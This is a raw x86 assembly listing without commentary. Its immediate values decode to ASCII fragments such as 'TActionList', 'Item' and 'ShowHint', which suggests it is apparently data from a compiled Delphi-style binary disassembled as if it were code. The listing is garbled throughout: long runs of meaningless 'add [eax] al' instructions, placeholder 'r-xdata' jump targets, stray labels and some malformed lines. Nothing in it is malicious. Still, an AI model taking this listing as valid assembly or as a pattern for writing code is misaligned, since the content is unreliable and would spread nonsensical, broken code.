add [ eax ] 0x0
add [ eax + 0x4f0d0010 ] al
outsb
push ebx
je r-xdata
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
push 0x65676e61
inc eax
pop edi
inc edi
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0011 ] al
outsb
push ebx
je r-xdata
inc ebx
nop
mov [ edi + eax * 2 ] ah
add [ eax ] al
add [ eax ] al
in al 0x49
inc ebp
add [ eax ] dl
add bh bh
push eax
je r-xdata
movsb [ edi ] [ esi ]
pop ebp
inc edi
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000c ] al
outsb
inc edi
je r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
push cs
dec edi
insb
loopne r-xdata
xchg esp eax
inc ecx
add [ 0x74634154 ] dl
imul ebp [ edi + 0x6e ] 0x7473694c
inc ebx
outsd
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
int3
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
popad
jo r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
mov [ edi + eax * 2 ] ah
clc
popad
inc ecx
add [ edx ] al
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add al [ eax ]
sub al 0x4b
inc ebp
add [ eax + eax ] cl
add bh bh
or [ edi + 0x10047 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410a0000 ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
sbb [ edi + 0x100047 ] cl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
pop es
inc ebx
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ edi + ecx * 2 ] dl
popad
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f11000b ] al
outsb
inc edi
je r-xdata
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080009 ] al
add [ eax ] 0x0
add [ eax + 0x4f08000f ] al
inc ebx
insb
popad
jae r-xdata
outsb
push ebp
jo r-xdata
str [ eax ]
dec edi
push 0xb800475e
add [ eax ] al
sub_476374
mov eax 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f11000d ] al
outsb
inc edi
je r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000f ] al
outsb
push ebp
jo r-xdata
insb
imul esp [ ebp + 0x6e ] 0x6c437374
popad
jae r-xdata
add al dl
inc edi
popad
je r-xdata
inc ebx
rcr [ esi + 0x47 ] 0x1
add [ eax - 0x4f010000 ] dh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f14000e ] al
outsb
inc edi
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
andps xmm0 [ ecx + 0x63 ]
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + edx * 4 + 0x41 ] dl
add al bh
lea eax [ ecx ]
add [ esi - 0x71afffbf ] cl
inc edi
add [ eax - 0x71 ] bl
inc edi
add [ eax - 0x2fffbe6e ] ah
xchg edx eax
inc ecx
add al cl
xchg edx eax
inc ecx
add [ ecx + edx * 4 ] bl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x14004764 ] bh
add [ eax ] al
add [ ecx + 0x41 ] ch
add [ eax + 0x33 ] dh
inc eax
loopne r-xdata
add [ eax ] al
insb
inc ebx
push 0x65676e61
add [ eax - 0x80000000 ] al
adc [ eax ] al
or eax 0x74536e4f
popad
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070001 ] al
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
mov eax eax
shl [ edi + eax * 2 ] 0x1
pop es
andps xmm0 [ ecx + 0x63 ]
je r-xdata
add [ eax ] al
add [ eax ] al
test al 0x64
inc edi
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0010 ] al
outsb
push ebx
je r-xdata
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
push 0x65676e61
inc eax
pop edi
inc edi
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0011 ] al
outsb
push ebx
je r-xdata
inc ebx
nop
mov [ edi + eax * 2 ] ah
add [ eax ] al
add [ eax ] al
in al 0x49
inc ebp
add [ eax ] dl
add bh bh
push eax
xchg esp eax
inc ecx
add [ 0x74634154 ] dl
imul ebp [ edi + 0x6e ] 0x7473694c
inc ebx
outsd
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
int3
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
popad
jo r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
mov [ edi + eax * 2 ] ah
clc
popad
inc ecx
add [ edx ] al
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add al [ eax ]
sub al 0x4b
inc ebp
add [ eax + eax ] cl
add bh bh
or [ edi + 0x10047 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410a0000 ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
sbb [ edi + 0x100047 ] cl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
pop es
inc ebx
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
je r-xdata
sub_476788
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x68
inc edi
add [ eax ] ch
push 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ss
push 0x380047
add [ eax ] al
insb
popad
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
mov al [ 0xffffffffa0340047 ]
inc edi
add [ eax + 0x47 ] cl
add al bh
popfd
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x200040 ] dl
add [ eax ] al
or eax 0x74634154
imul ebp [ edi + 0x6e ] 0x65696c43
outsb
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + ebx * 4 + 0x47 ] dl
add al bh
lea eax [ ecx ]
add [ esi - 0x65fbffbf ] cl
inc edi
add al al
xchg ecx eax
inc ecx
add [ eax - 0x2fffbe6e ] ah
xchg edx eax
inc ecx
add al cl
xchg edx eax
inc ecx
add ah dh
cwde
inc edi
add ah bh
0xa01c0047 0x47
xor al 0xa0
inc edi
add [ ecx ] dh
add [ eax ] al
jmp [ eax + eax ]
push 0xd070047
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x4767d074
add al bh
popad
inc ecx
add [ eax ] cl
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
or [ eax ] al
inc edi
sub_476855
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x7 ] al
inc ebx
insb
insb
outsd
ja r-xdata
inc edi
add [ eax ] al
add [ eax ] al
js r-xdata
arpl [ ebx + 0x67 ] bp
jb r-xdata
dec eax
and al 0x42
add [ eax + eax ] ah
add bh bh
sub [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x20000000 ] al
add [ eax ] eax
add eax 0x6f6c6f43
jb r-xdata
inc edi
add [ eax + eax ] bh
add [ eax ] al
insd
jae r-xdata
dec ecx
je r-xdata
add [ eax ] dh
add [ eax ] al
[ eax + eax ]
jne r-xdata
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x4767d074
add al bh
popad
inc ecx
add [ eax ] cl
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
or [ eax ] al
inc edi
add [ ecx ] dh
add [ eax ] al
jmp [ eax + eax ]
outsd
outsb
je r-xdata
insb
inc edi
add [ eax + 0x4800479b ] al
mov al [ 0xffffffff99b80047 ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c0002 ] al
mov al [ 0xffffffffa0340047 ]
inc edi
add [ eax - 0x5e ] cl
inc edi
add [ ecx ] al
inc edi
add [ esi ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + ebx * 4 + 0x47 ] dl
add al bh
lea eax [ ecx ]
add [ esi - 0x65fbffbf ] cl
inc edi
add al al
mov al [ 0xffffffff92a00047 ]
inc ecx
add al dl
xchg edx eax
inc ecx
add al cl
xchg edx eax
inc ecx
add [ eax - 0x5fa3ffb9 ] al
inc edi
add [ eax ] bl
inc edi
add [ eax ] dh
test [ edi + 0x47 ] ah
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
bound ebp [ ebp - 0x70 ]
adc [ eax ] al
xor al 0x0
add bh bh
xor al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] al
push esp
popad
add [ bx + si ] dl
inc eax
add [ eax ] 0x0
add [ eax + 0x49050005 ] al
je r-xdata
insd
jae r-xdata
mov eax 0x4769
xor [ eax ] al
add bh bh
sub al 0x0
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
pop es
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
mov esp 0x14004766
add [ eax ] al
inc [ eax + 0x100479f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ edx + 0x61 ] al
arpl [ ebx + 0x67 ] bp
jb r-xdata
je r-xdata
je r-xdata
add [ eax ] al
push cs
inc ebx
push 0x65676e61
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
xor [ edx ] al
pushad
fwait
inc edi
add [ edi + ebx * 4 ] al
inc edi
add [ eax ] dh
popfd
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x420a0003 ] al
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x47
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebx + 0x47 ] ch
add [ eax ] dh
outsd
outsb
inc edx
popad
jb r-xdata
add [ ecx ] cl
add [ eax ] cl
inc ecx
jne r-xdata
insd
nop
add [ edx + 0x47 ] ch
add [ edi ] al
push cs
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
imul eax [ edi ] 0x3c
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
popad
jns r-xdata
xchg esp eax
inc ecx
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
adc [ eax ] al
cmp [ eax ] al
add bh bh
and [ ecx + 0x10047 ] ah
inc eax
add [ ebx + edx * 4 + 0x41 ] cl
outsd
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] eax
or [ ecx + 0x75 ] al
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ edx + 0x47 ] ch
jne r-xdata
jae r-xdata
sbb [ ebx + 0x47 ] ch
add [ edi ] al
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
add al bh
lea eax [ ecx ]
add [ esi - 0x6c47ffbf ] cl
inc ecx
add [ eax + ebx * 4 + 0x41 ] dl
add [ eax - 0x68 ] bl
inc ecx
add [ ebx ] ch
inc edi
add [ eax ] dl
cwde
inc eax
add ah bl
xor [ eax ] al
dec esp
xchg ebx eax
inc ecx
push ebx
imul edi [ edx + 0x65 ] sub_434e4c
cmp [ eax ] eax
add bh bh
cmp al 0xa1
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ecx
add [ eax + ebx * 4 ] dl
inc ecx
add [ eax - 0x6c ] dl
push 0x6f79614c
jne r-xdata
or al [ eax ]
or eax [ edi + 0x6c ]
jns r-xdata
mov eax [ 0x10047 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
mov eax 0x24004769
push 0xb0047
pop es
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add eax [ eax ]
call 0xc47b19e
add [ eax ] al
pushfd
insb
inc edi
add ah dh
fwait
inc edi
add ah ch
sahf
inc edi
add [ ebp + ebx * 4 + 0x47 ] ch
add [ eax - 0x80000000 ] al
add eax 0x74490500
insd
add [ eax ] al
add eax [ eax ]
or [ ebx + 0x68 ] edx
outsd
ja r-xdata
adc [ eax ] al
sub [ eax ] al
add bh bh
sub [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] ch
add [ eax ] al
[ eax ]
outsd
outsb
inc edx
popad
jb r-xdata
lea eax [ eax ]
loopne r-xdata
nop
insb
imul ebp [ esi + 0x74 ] 0x6bd89073
inc edi
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x476c ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 2 + 0x2c0047 ] cl
add [ eax ] al
clc
inc edi
add [ eax + 0x33 ] dh
imul ebp [ edi + 0x6e ] 0x6e756f43
je r-xdata
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc ecx
add ah cl
push eax
xchg esp eax
add [ eax ] al
add al bh
inc edi
add [ eax + 0x33 ] dh
inc eax
add [ eax - 0x69 ] bh
inc edi
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
imul eax [ edi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
imul eax [ edi ] 0x30
xchg esp eax
inc ecx
add [ esi ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
imul esp [ ebp + 0x6e ] 0xa0907374
insb
inc edi
add [ edi ] al
push cs
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c647374
inc edi
add [ eax + 0x5004766 ] cl
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add eax 0x40100000
add [ eax + eax ] bl
add bh bh
in al 0x98
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
or eax [ ecx + 0x75 ]
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ebx + edx * 4 + 0x41 ] cl
add al bh
lea eax [ ecx ]
add [ esi - 0x5c03ffbf ] cl
inc edi
add [ eax + ebx * 4 + 0x41 ] dl
add [ eax - 0x68 ] bl
inc ecx
add al ch
movsb [ edi ] [ esi ]
inc edi
add [ eax ] dl
cwde
inc ecx
add [ eax + ebx * 4 ] dl
inc ecx
add [ eax - 0x6c ] dl
inc ecx
add ah cl
add [ eax + 0x33 ] bh
imul ebp [ edi + 0x6e ] 0x6974704f
outsd
outsb
jae r-xdata
adc [ eax ] al
sub al 0x0
add bh bh
jo r-xdata
add al [ eax ]
or al 0x53
jae r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc edi
add [ eax + 0x4004766 ] cl
add [ edi ] al
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
add al 0x0
add [ eax ] dl
inc eax
add [ eax + eax ] ah
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
or al 0x43
jne r-xdata
popad
jo r-xdata
dec eax
outsd
je r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dl
imul eax [ edi ] 0x6
arpl [ edi + 0x4e ] bp
outsd
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
aam 0x6b
inc edi
add [ esi ] al
popad
bound ebp [ ebp ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
push ebx
push 0x6948776f
outsb
je r-xdata
je r-xdata
xor [ eax ] al
test al 0x15
inc edx
add [ eax + ebp * 4 + 0x15dc0047 ] al
inc edx
add [ ebx + ebp * 4 + 0x47 ] cl
imul ebp [ edi + 0x6e ] 0x6974704f
outsd
jne r-xdata
jns r-xdata
outsb
or esp [ gs : ebx + 0x6f ]
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x76 ] si
add eax 0x6c416f63
insb
pop es
inc ecx
arpl [ esi + ebp * 2 + 0x4d ] si
popad
outsb
inc eax
add [ eax - 0x69 ] bh
inc edi
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ ebx ] al
andps xmm0 [ ebx + 0x61 ]
jo r-xdata
nop
fsubr [ ebx + 0x47 ]
add [ ecx ] cl
adc [ eax ] al
adc al 0xa3
inc edi
add [ eax + 0x10047a3 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] eax
or eax 0x746e6948
push ebx
push 0x4374726f
jne r-xdata
insd
imul edi [ edx + 0x61 ] 0x656c62
inc edi
add [ eax ] dh
mov cl 0x47
add [ eax + edi * 4 - 0x4a27ffb9 ] cl
inc edi
add al cl
xchg edx eax
inc ecx
add [ ebp * 4 - 0x4fbfffb9 ] ch
inc edi
add [ eax ] ah
mov eax 0xa0340047
inc edi
add [ eax + 0x80047b7 ] ch
mov bl 0x47
add [ edx + esi * 4 + 0x47 ] dh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x540040 ] dl
add [ eax ] al
add al [ eax ]
std
push edx
popad
outsb
add eax 0x0
adc [ eax ] al
sub [ eax ] eax
add bh bh
sub al 0xa7
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
add [ eax + eax ] bl
add [ eax ] al
dec esp
push edx
inc ebp
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
aam 0x6b
inc edi
add [ eax ] ch
add [ eax ] al
push [ esi + 0x47 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
push cs
inc ebx
outsb
jae r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] ah
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] eax
or al 0x43
jne r-xdata
insd
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 2 + 0x47 ] cl
pop ecx
inc ebp
add [ edx + ebp * 4 + 0x47 ] dl
add [ ecx + ebx * 2 + 0x45 ] bl
add [ edx + ebp * 4 + 0x59840047 ] dl
inc ebp
add ah al
stosb [ edi ]
inc edi
add [ eax ] cl
stosd [ edi ]
inc edi
add [ eax - 0x4bffb855 ] al
stosd [ edi ]
inc edi
add al ch
pop ecx
inc ebp
add al ch
stosd [ edi ]
inc edi
add [ eax ] cl
lodsb [ esi ]
inc edi
add [ esp + ebp * 4 ] dh
inc edi
add al bh
pop ecx
inc ebp
add [ eax - 0x54 ] bl
inc edi
add [ eax ] al
pop edx
inc ebp
add [ edx + ebx * 2 ] al
inc ebp
add [ esp + ebp * 4 + 0x47 ] dh
add [ esp + ebp * 4 - 0x5313ffb9 ] bl
inc edi
add [ ebp * 4 - 0x575fffb9 ] cl
inc edi
add [ ecx ] dl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6e694c74
imul ecx [ ebx + 0x476e64c0 ] 0x0
add [ ebx ] ecx
push esp
dec ebp
jb r-xdata
add [ eax ] dl
push ss
inc edx
add [ esp + ebp * 4 + 0x15600047 ] bh
inc edx
add ah dh
adc eax 0x16480042
inc edx
add [ eax + 0x340047a9 ] dl
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x7bffbdeb ] ch
test al 0x47
add ah bl
adc eax 0xab4c0042
inc edi
popad
insb
insb
dec ecx
arpl [ edi + 0x6e ] bp
jae r-xdata
insd
je r-xdata
or dl [ ebx + 0x6d ]
insd
imul edi [ edx + 0x61 ] 0x656c62
adc [ eax ] al
sub al [ eax ]
add bh bh
add [ edi + 0x10047 ] ah
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
or cl [ eax + 0x69 ]
push ebp
outsb
sub_4770f8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jno r-xdata
inc esp
add [ 0x54140044 ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
jb r-xdata
add [ eax + eax ] bh
add [ eax ] al
xor al 0x38
inc esp
add [ eax + 0x33 ] dh
inc eax
add [ ebp + 0x44 ] ch
add [ ebp + 0x44 ] bh
add [ ebx + esi + 0x33780040 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
movsb [ edi ] [ esi ]
arpl [ eax + eax - 0x18 ] ax
inc esp
add ah ah
inc esp
add al ch
arpl [ eax + eax + 0x4c ] ax
arpl [ eax + eax - 0x54 ] ax
arpl [ eax + eax ] ax
inc esp
add [ 0x650c0044 ] al
inc esp
add [ esp + edx * 2 ] dl
in al 0x64
inc esp
add al ch
arpl [ eax + eax + 0x4c ] ax
inc edx
popad
jae r-xdata
call 0x4c47b6c0
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
dec esp
jb r-xdata
arpl [ eax + eax - 0x54 ] ax
arpl [ eax + eax ] ax
inc esp
add [ 0x650c0044 ] al
inc esp
add [ ecx ] dl
push esp
inc ebx
insb
popad
jae r-xdata
inc esp
add al ch
arpl [ eax + eax + 0x4c ] ax
outsd
jb r-xdata
arpl [ eax + eax - 0x54 ] ax
arpl [ eax + eax ] ax
inc esp
inc edi
add [ ebx + 0x64e80044 ] ah
inc esp
add ah ah
inc esp
add al ch
arpl [ eax + eax + 0x4c ] ax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x72 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x4c004772 ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x47 ] bh
add [ eax + 0x33 ] dh
inc eax
add [ ebp + 0x44 ] ch
add [ ebp + 0x44 ] bh
add [ ebx + esi + 0x33780040 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x46 ] al
adc [ ecx + eax * 2 + 0x63 ] edx
je r-xdata
lea eax [ eax ]
enter 0x4771 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jno r-xdata
mov [ ecx ] dl
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
insb
jae r-xdata
add [ 0x74634154 ] dl
imul ebp [ edi + 0x6e ] 0x6d657449
inc esp
inc esp
jb r-xdata
add [ 0x650c0044 ] al
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
adc edx [ ebx + eax * 2 + 0x61 ]
je r-xdata
add [ ebx + 0x44 ] cl
add [ ebx + 0x65000044 ] ch
inc esp
outsb
inc esp
jb r-xdata
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
inc esp
add [ 0x54110044 ] cl
add [ eax ] cl
add [ eax ] al
hlt
xor al 0xe7
je r-xdata
inc edx
add [ esp + edi * 4 + 0x11980047 ] dl
inc edx
add [ eax - 0x2bffbdee ] dl
adc al 0x42
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add ah ah
mov ebx 0xbd0c0047
inc edi
add [ ebp + edi * 4 + 0x47 ] dh
add al cl
mov ebp 0x54180047
inc ebx
jne r-xdata
inc edi
add al bh
lea eax [ ecx ]
mov al 0x10
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
jae r-xdata
arpl [ eax + eax - 0x54 ] ax
arpl [ eax + eax ] ax
inc esp
add [ 0x650c0044 ] al
inc esp
call 0x4c47b758
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
in al 0x72
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jae r-xdata
add [ eax ] al
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc edx
popad
jb r-xdata
mov esi 0x11880047
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffb88d ] ch
add [ eax ] al
add [ eax - 0x43ffbe93 ] dh
adc al 0x42
inc esp
add [ 0x54150044 ] cl
add [ eax + eax ] al
add ah dh
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
jne r-xdata
outsd
insb
outsd
jb r-xdata
inc esp
jb r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
je r-xdata
add [ eax + 0x33 ] dh
inc eax
add [ ebp + 0x44 ] ch
add [ ebp + 0x44 ] bh
add [ ebx + esi + 0x33780040 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
lodsb [ esi ]
mov edx 0x64e80047
inc esp
add ah ah
inc edi
add ah dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2bffb88b ] dl
